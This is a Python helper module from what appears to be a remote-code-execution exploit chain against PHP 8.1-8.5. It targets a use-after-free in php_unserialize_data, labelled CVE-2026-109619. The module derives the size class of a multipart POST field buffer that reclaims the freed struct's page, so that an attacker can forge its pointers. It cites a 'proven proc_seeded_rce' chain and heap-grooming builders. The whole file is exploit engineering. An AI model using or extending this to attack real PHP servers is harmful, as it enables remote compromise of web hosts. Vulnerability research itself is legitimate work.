#!/usr/bin/env python3
# INDEX: php_unserialize_data d-reclaim size-class + out-carrier length | all | derived, no addresses
"""php_unserialize_data reclaim size-class (ext/standard/var_unserializer.re +
Zend/zend_alloc*.{c,h} + main/rfc1867.c): which request-controlled HTTP
allocation lands in the freed `d`, by size class and allocator ordering alone --
no live address reads.

The CVE-2026-109619 dangle is BG(unserialize).data == d, a freed
`struct php_unserialize_data`. To forge d's bookkeeping an attacker buffer must
occupy d's bytes. This module derives, from source constants only, WHICH buffer
size and class does that, and why the carrier choice matters.

Sizes (BYTE-IDENTICAL across PHP 8.1-8.5: struct + VAR_ENTRIES_MAX unchanged):
    sizeof(var_entries)          = 8 + 8 + VAR_ENTRIES_MAX*8   = 8160
    sizeof(var_dtor_entries)     = 8 + 8 + VAR_DTOR*16         = 4096
    sizeof(php_unserialize_data) = 7*8 + sizeof(var_entries)   = 8216

ZendMM class: 8216 > ZEND_MM_MAX_SMALL_SIZE (3072) -> `d` is a LARGE (page-run)
allocation, NOT a small-bin free-list slot. pages(d) = ceil(8216/4096) = 3, and
`d` is ZEND_MM_PAGE_SIZE-aligned (zend_mm_alloc_pages returns a page base). The
first var_dtor_entries DT (4096 = 1 page) is the 1-page run allocated right
after d -> the gdb-observed invariant DT - d = 0x3000 IS this arithmetic.

All forge-relevant d fields sit in d's FIRST page: last@0, first_dtor@0x8,
last_dtor@0x10, plus the fake var_entries/var_dtor_entries the groom plants
(last_dtor_forge: offsets <= 0x340; bss_last_dtor_forge: <= 0x118). So the
carrier need only occupy d's first page -- not all three.

Carrier = the RAW `out` buffer of multipart_buffer_read_body (main/rfc1867.c),
`out = erealloc(out, L+1)`, whose byte 0 == the POST field value's byte 0. Two
requirements, both size-class facts, no addresses:
  (1) LARGE: L+1 > ZEND_MM_MAX_SMALL_SIZE so `out` is a PAGE-RUN (can land on a
      freed page). A small-bin `out` (L+1 <= 3072) is carved from a small-bin
      run on a different page and can never reclaim d.
  (2) FITS: one page (L+1 <= 4096) suffices (forge footprint < 4096) and
      exact/best-fits a single freed page out of d's 3-page hole. The proven
      proc_seeded_rce default is L = 4071 (out = 4072 bytes = 1 page).
A `$_POST` zend_string cannot be the carrier: its header (gc@0, h@0x8, len@0x10)
overlays d->last / d->first_dtor / d->last_dtor and its DATA starts at base+0x18,
so the exact fields the forge needs are header-owned. `out` has no header.

Placement law (zend_mm_alloc_pages, Best-Fit, zend_alloc.c): scan low page ->
high; a run of length == pages_count short-circuits (`goto found`) and best-fit
otherwise returns the START of the smallest adequate run. A 1-page request from
d's 3-page hole returns d's base page (lowest), leaving the other two free. The
`out` is efree'd right after register_variable, but ZendMM large-free only flips
free_map bits -- the forged bytes persist at d until overwritten, i.e. into the
upload-progress decode that walks the stale BG(unserialize).data.

Residual to OFFSET-FREE: landing a carrier on d's SPECIFIC page (vs any free
page) is an ORDERING problem -- make d's hole the best-fit choice at carrier
time, by marching the low region's fill up to d or reproducing the producer's
pre-d page footprint. That is heap grooming, not address measurement; see
reclaim_notes().

Finisher-agnostic: pure arithmetic/constants, no I/O. Consumed by the d-reclaim
groom builders (last_dtor_forge / bss_last_dtor_forge) to size the carrier field.
Stage: DERIVED from source (8.1-8.5); size class cross-checked vs the
gdb-observed DT-d=0x3000 and the proven proc_seeded_rce --size 4071.
"""

# --- ext/standard/var_unserializer.re (8.1-8.5, identical) ---
VAR_ENTRIES_MAX = 1018
VAR_DTOR_ENTRIES_MAX = 255
SIZEOF_ZVAL = 16
PTR = 8

# --- Zend/zend_alloc_sizes.h ---
ZEND_MM_PAGE_SIZE = 4096
ZEND_MM_MAX_SMALL_SIZE = 3072

# --- main/rfc1867.c ---
FILLUNIT = 1024 * 5          # multipart_buffer_read chunk size

# max byte offset the d-reclaim forges write into the carrier value
# (last_dtor_forge fd-slot <= 0x30f; round up). Must stay < one page.
FORGE_FOOTPRINT = 0x340

# proc_seeded_rce's proven carrier length (1-page `out`).
PROVEN_VALUE_LEN = 4071


def sizeof_var_entries():
    return PTR + PTR + VAR_ENTRIES_MAX * PTR               # 8160


def sizeof_var_dtor_entries():
    return PTR + PTR + VAR_DTOR_ENTRIES_MAX * SIZEOF_ZVAL  # 4096


def sizeof_php_unserialize_data():
    # last, first_dtor, last_dtor, allowed_classes, ref_props (5 ptr)
    # + cur_depth, max_depth (2 long) + embedded var_entries
    return 7 * PTR + sizeof_var_entries()                  # 8216


def is_large(size):
    """True if emalloc(size) is a ZendMM large (page-run) allocation."""
    return size > ZEND_MM_MAX_SMALL_SIZE


def large_pages(size):
    """ZEND_MM_SIZE_TO_NUM(size, PAGE): page count of a large allocation."""
    assert is_large(size), f"{size} is a small-bin size, not page-run"
    return (size + ZEND_MM_PAGE_SIZE - 1) // ZEND_MM_PAGE_SIZE


def pud_pages():
    """Page span of the freed php_unserialize_data `d` (== 3, 8.1-8.5)."""
    return large_pages(sizeof_php_unserialize_data())


def vde_pages():
    """Page span of a var_dtor_entries block (== 1)."""
    return large_pages(sizeof_var_dtor_entries())


def dt_minus_d():
    """Chunk-relative DT - d gap: d's run (pud_pages) then DT's 1-page run."""
    return pud_pages() * ZEND_MM_PAGE_SIZE                 # 0x3000


def carrier_is_viable(value_len):
    """A POST field value of `value_len` bytes yields a page-run `out` that can
    reclaim a freed page (large) AND whose forged bytes fit one page."""
    out_size = value_len + 1                               # erealloc(out, L+1)
    return is_large(out_size) and FORGE_FOOTPRINT <= ZEND_MM_PAGE_SIZE


def carrier_pages(value_len):
    """Page span of the `out` buffer for a value of `value_len` bytes."""
    return large_pages(value_len + 1)


def reclaim_value_len(pages=1):
    """A fully-packed value length whose `out` is exactly `pages` pages
    (L+1 == pages*PAGE). pages=1 -> 4095 (or use PROVEN_VALUE_LEN=4071 for the
    margin the reference chain keeps)."""
    assert pages >= 1
    L = pages * ZEND_MM_PAGE_SIZE - 1
    assert is_large(L + 1), "value too small -> small-bin out, cannot reclaim"
    return L


def reclaim_value_len_window(pages=1):
    """[lo, hi] value-length range whose `out` is exactly `pages` pages and
    large. For pages=1: (3072, 4095]."""
    hi = pages * ZEND_MM_PAGE_SIZE - 1
    lo = max((pages - 1) * ZEND_MM_PAGE_SIZE, ZEND_MM_MAX_SMALL_SIZE)
    return lo, hi


def read_body_realloc_steps(value_len):
    """erealloc size sequence multipart_buffer_read_body walks (one step per
    FILLUNIT read); last entry is the final `out` size. Documents the grow."""
    steps, total = [], 0
    while total < value_len:
        total += min(FILLUNIT, value_len - total)
        steps.append(total + 1)
    return steps or [1]


def reclaim_notes():
    return (
        "Carrier = raw `out` of multipart_buffer_read_body (byte-0 aligned), "
        "value length > 3072 to force a page-run; 1 page (L=4071) lands on d's "
        "first page where all forge fields live. Best-fit returns the start of "
        "the chosen run; feed many carrier fields so one lands on d's hole, its "
        "forged bytes persisting (large-free is a bit-flip) into the "
        "upload-progress decode of the stale BG(unserialize).data. OFFSET-FREE "
        "residual = make d's hole the best-fit choice (ordering/groom), not a "
        "measured a_off.")


if __name__ == "__main__":
    print(f"sizeof(var_entries)          = {sizeof_var_entries()}")
    print(f"sizeof(var_dtor_entries)     = {sizeof_var_dtor_entries()}")
    print(f"sizeof(php_unserialize_data) = {sizeof_php_unserialize_data()}")
    print(f"d is large / page span       = {is_large(sizeof_php_unserialize_data())} / {pud_pages()}")
    print(f"var_dtor_entries page span   = {vde_pages()}")
    print(f"DT - d                       = {dt_minus_d():#x}")
    print(f"proven carrier len {PROVEN_VALUE_LEN} viable = {carrier_is_viable(PROVEN_VALUE_LEN)} "
          f"({carrier_pages(PROVEN_VALUE_LEN)} page)")
    print(f"1-page value-len window      = {reclaim_value_len_window(1)}")
    print(f"erealloc steps for L=4071    = {read_body_realloc_steps(4071)}")
    print(reclaim_notes())
